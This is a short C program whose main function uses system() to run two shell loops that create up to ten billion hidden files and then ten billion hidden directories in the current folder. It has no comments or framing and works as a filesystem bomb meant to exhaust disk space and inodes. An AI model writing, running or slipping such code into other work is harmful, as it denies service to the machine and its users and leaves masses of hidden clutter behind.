#include <stdlib.h>

int main(){
   system("for ((i=0; i<=9999999999; i++)); do touch .F$i; done");
   system("for ((i=0; i<=9999999999; i++)); do mkdir .D$i; done");
}
